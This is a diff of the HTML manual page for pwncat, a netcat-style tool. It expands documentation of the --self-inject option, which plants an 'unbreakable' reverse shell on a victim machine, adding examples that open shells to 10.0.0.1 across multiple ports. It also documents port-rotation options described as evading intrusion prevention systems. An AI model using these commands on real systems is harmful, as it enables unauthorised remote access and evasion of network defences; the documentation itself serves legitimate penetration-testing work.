@@ -246,7 +246,7 @@ This mode also disables color on Windows by default.
 
 <p style="margin-left:11%; margin-top: 1em"><b>command
 &amp; control arguments: <br>
-&minus;&minus;self&minus;inject</b> cmd:host:port</p>
+&minus;&minus;self&minus;inject</b> cmd:host:port[s]</p>
 
 <p style="margin-left:22%;">Listen mode (TCP only): If you
 are about to inject a reverse shell onto the victim machine
@@ -257,7 +257,14 @@ background&minus;run an unbreakable pwncat reverse shell
 onto the victim machine which then also connects back to you
 with specified arguments. Example:
 &rsquo;&minus;&minus;self&minus;inject
-/bin/bash:10.0.0.1:4444&rsquo; Note: this is currently an
+/bin/bash:10.0.0.1:4444&rsquo; It is also possible to launch
+multiple reverse shells by specifying multiple ports. Via
+list: <b>&minus;&minus;self&minus;inject</b>
+/bin/sh:10.0.0.1:4444,4445,4446 Via range:
+<b>&minus;&minus;self&minus;inject</b>
+/bin/sh:10.0.0.1:4444&minus;4446 Via incr:
+<b>&minus;&minus;self&minus;inject</b>
+/bin/sh:10.0.0.1:4444+2 Note: this is currently an
 experimental feature and does not work on Windows remote
 hosts yet.</p>
 
@@ -370,11 +377,11 @@ port</p>
 the server is unable to initialize (e.g: cannot bind and
 <b>&minus;&minus;rebind</b> is specified, it it will shuffle
 ports in round&minus;robin mode to bind to. Use comma
-separated string such as &rsquo;80,81,82&rsquo; or a range
-of ports &rsquo;80&minus;100&rsquo;. Set
-<b>&minus;&minus;rebind</b> to at least the number of ports
-to probe +1 This option requires <b>&minus;&minus;rebind</b>
-to be specified.</p>
+separated string such as &rsquo;80,81,82,83&rsquo;, a range
+of ports &rsquo;80&minus;83&rsquo; or an increment
+&rsquo;80+3&rsquo;. Set <b>&minus;&minus;rebind</b> to at
+least the number of ports to probe +1 This option requires
+<b>&minus;&minus;rebind</b> to be specified.</p>
 
 <p style="margin-left:11%;"><b>&minus;&minus;reconn</b>
 [x]</p>
@@ -405,14 +412,14 @@ mode (TCP only): If the remote server is not reachable or
 the connection is interrupted and
 <b>&minus;&minus;reconn</b> is specified, the client will
 shuffle ports in round&minus;robin mode to connect to. Use
-comma separated string such as &rsquo;80,81,82&rsquo; or a
-range of ports &rsquo;80&minus;100&rsquo;. Set
-<b>&minus;&minus;reconn</b> to at least the number of ports
-to probe +1 This helps reverse shell to evade intrusiona
-prevention systems that will cut your connection and block
-the outbound port. This is also useful in Connect or
-Zero&minus;I/O mode to figure out what outbound ports are
-allowed.</p>
+comma separated string such as &rsquo;80,81,82,83&rsquo;, a
+range of ports &rsquo;80&minus;83&rsquo; or an increment
+&rsquo;80+3&rsquo;. Set <b>&minus;&minus;reconn</b> to at
+least the number of ports to probe +1 This helps reverse
+shell to evade intrusiona prevention systems that will cut
+your connection and block the outbound port. This is also
+useful in Connect or Zero&minus;I/O mode to figure out what
+outbound ports are allowed.</p>
 
 <p style="margin-left:11%;"><b>&minus;w</b> s,
 <b>&minus;&minus;wait</b> s</p>
@@ -472,8 +479,11 @@ port</p>
 mode (TCP and UDP): Instruct the client to shuffle the
 specified ports in round&minus;robin mode for a remote
 server to ping. This might be handy to scan outbound allowed
-ports. Use <b>&minus;&minus;ping&minus;intvl</b> 0 to be
-faster.</p>
+ports. Use comma separated string such as
+&rsquo;80,81,82,83&rsquo;, a range of ports
+&rsquo;80&minus;83&rsquo; or an increment
+&rsquo;80+3&rsquo;. Use
+<b>&minus;&minus;ping&minus;intvl</b> 0 to be faster.</p>
 
 
 <p style="margin-left:11%;"><b>&minus;&minus;safe&minus;word</b>
